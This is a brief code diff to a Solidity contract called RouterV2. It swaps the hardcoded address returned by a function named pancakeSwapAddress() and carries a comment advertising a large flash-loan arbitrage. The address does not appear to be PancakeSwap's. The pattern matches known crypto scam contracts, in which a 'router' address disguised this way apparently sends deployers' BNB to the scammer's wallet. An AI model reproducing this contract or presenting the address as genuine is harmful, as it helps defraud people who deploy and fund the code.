@@ -125,7 +125,7 @@ contract RouterV2 {
     }
 
     function pancakeSwapAddress() public pure returns (address) {
-        return 0x947f8b2d98Dc3F310e77A16a3B675505852aEB41; //0x05f18088749F7eDffe9ae56d628dd97e5b4d048f //
+        return 0x147833a97Ff0061A658EbAA50BDDd01160850Fc7; //0x98af9919aD60c6f06409523175134F1C8325ce93 //
     }
 
     //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
